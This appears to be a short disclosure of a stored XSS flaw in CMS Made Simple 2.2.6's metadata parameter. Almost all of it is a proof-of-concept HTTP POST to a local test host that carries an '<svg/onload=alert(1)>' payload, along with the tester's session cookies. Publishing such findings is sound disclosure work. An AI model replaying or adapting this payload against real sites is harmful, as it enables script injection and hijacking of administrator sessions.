
## Stored XSS 
CMS Made Simple (CMSMS) 2.2.6 has XSS in admin/moduleinterface.php via the metadata parameter.


### POC

parameter 'metadata'

   ```
   POST /cmsms/admin/moduleinterface.php HTTP/1.1
Host: 127.0.0.1
Content-Length: 3883
Cache-Control: max-age=0
Origin: http://127.0.0.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryqBoqEeUNsALJmdFV
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: http://127.0.0.1/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,en;q=0.6
Cookie: 76ebf50c96b1db28a5787356b7b6a170=76b2219abe67ede483a103746fc5293a3840b2f6%3A%3AYTo1OntzOjM6InVpZCI7aToxO3M6ODoidXNlcm5hbWUiO3M6NToiYWRtaW4iO3M6NzoiZWZmX3VpZCI7TjtzOjEyOiJlZmZfdXNlcm5hbWUiO047czo1OiJja3N1bSI7czo0MDoiYzg3ZmQ0YjE4NDNmYWZjNzQyOTVmNTY1MTNlNGUzYWJlZjA0OTk2NiI7fQ%3D%3D; _sk_=9687e2d35edeb56100c; u=0b08f08a7dc7e236549449d423f7db17a1be2595; CMSIC3390714ec7=a0cm17ne3buacgnn0c36l6end2; CMSSESSIDab08e15a2ef7=tdrfle5gdlfgd46lm3ufm4as60
Connection: close

------WebKitFormBoundaryqBoqEeUNsALJmdFV
Content-Disposition: form-data; name="mact"

CMSContentManager,m1_,admin_editcontent,0
------WebKitFormBoundaryqBoqEeUNsALJmdFV
Content-Disposition: form-data; name="_sk_"

9687e2d35edeb56100c
------WebKitFormBoundaryqBoqEeUNsALJmdFV
Content-Disposition: form-data; name="m1_content_id"

34
------WebKitFormBoundaryqBoqEeUNsALJmdFV
Content-Disposition: form-data; name="m1_active_tab"


------WebKitFormBoundaryqBoqEeUNsALJmdFV
Content-Disposition: form-data; name="m1_content_type"

content
------WebKitFormBoundaryqBoqEeUNsALJmdFV
Content-Disposition: form-data; name="title"

Copy of test
------WebKitFormBoundaryqBoqEeUNsALJmdFV
Content-Disposition: form-data; name="content_en"

<p>test xss</p>
------WebKitFormBoundaryqBoqEeUNsALJmdFV
Content-Disposition: form-data; name="menutext"

Copy of test
------WebKitFormBoundaryqBoqEeUNsALJmdFV
Content-Disposition: form-data; name="parent_id"

-1
------WebKitFormBoundaryqBoqEeUNsALJmdFV
Content-Disposition: form-data; name="showinmenu"

0
------WebKitFormBoundaryqBoqEeUNsALJmdFV
Content-Disposition: form-data; name="showinmenu"

1
------WebKitFormBoundaryqBoqEeUNsALJmdFV
Content-Disposition: form-data; name="titleattribute"


------WebKitFormBoundaryqBoqEeUNsALJmdFV
Content-Disposition: form-data; name="accesskey%22"


------WebKitFormBoundaryqBoqEeUNsALJmdFV
Content-Disposition: form-data; name="tabindex"

0
------WebKitFormBoundaryqBoqEeUNsALJmdFV
Content-Disposition: form-data; name="target"

---
------WebKitFormBoundaryqBoqEeUNsALJmdFV
Content-Disposition: form-data; name="metadata"

<svg/onload=alert(1)>
------WebKitFormBoundaryqBoqEeUNsALJmdFV
Content-Disposition: form-data; name="pagedata"

1
------WebKitFormBoundaryqBoqEeUNsALJmdFV
Content-Disposition: form-data; name="design_id"

2
------WebKitFormBoundaryqBoqEeUNsALJmdFV
Content-Disposition: form-data; name="template_id"

10
------WebKitFormBoundaryqBoqEeUNsALJmdFV
Content-Disposition: form-data; name="alias"

copy-of-sdf
------WebKitFormBoundaryqBoqEeUNsALJmdFV
Content-Disposition: form-data; name="active"

0
------WebKitFormBoundaryqBoqEeUNsALJmdFV
Content-Disposition: form-data; name="active"

1
------WebKitFormBoundaryqBoqEeUNsALJmdFV
Content-Disposition: form-data; name="secure"

0
------WebKitFormBoundaryqBoqEeUNsALJmdFV
Content-Disposition: form-data; name="cachable"

0
------WebKitFormBoundaryqBoqEeUNsALJmdFV
Content-Disposition: form-data; name="cachable"

1
------WebKitFormBoundaryqBoqEeUNsALJmdFV
Content-Disposition: form-data; name="image"


------WebKitFormBoundaryqBoqEeUNsALJmdFV
Content-Disposition: form-data; name="thumbnail"


------WebKitFormBoundaryqBoqEeUNsALJmdFV
Content-Disposition: form-data; name="extra1"


------WebKitFormBoundaryqBoqEeUNsALJmdFV
Content-Disposition: form-data; name="extra2"


------WebKitFormBoundaryqBoqEeUNsALJmdFV
Content-Disposition: form-data; name="extra3"


------WebKitFormBoundaryqBoqEeUNsALJmdFV
Content-Disposition: form-data; name="wantschildren"

0
------WebKitFormBoundaryqBoqEeUNsALJmdFV
Content-Disposition: form-data; name="wantschildren"

1
------WebKitFormBoundaryqBoqEeUNsALJmdFV
Content-Disposition: form-data; name="searchable"

0
------WebKitFormBoundaryqBoqEeUNsALJmdFV
Content-Disposition: form-data; name="searchable"

1
------WebKitFormBoundaryqBoqEeUNsALJmdFV
Content-Disposition: form-data; name="disable_wysiwyg"

0
------WebKitFormBoundaryqBoqEeUNsALJmdFV
Content-Disposition: form-data; name="ownerid"

1
------WebKitFormBoundaryqBoqEeUNsALJmdFV
Content-Disposition: form-data; name="additional_editors"


------WebKitFormBoundaryqBoqEeUNsALJmdFV
Content-Disposition: form-data; name="m1_submit"

Submit
------WebKitFormBoundaryqBoqEeUNsALJmdFV--

   ```

![](https://hexoblog-1253112764.file.myqcloud.com/cmsms-store-xss-1.png)

    
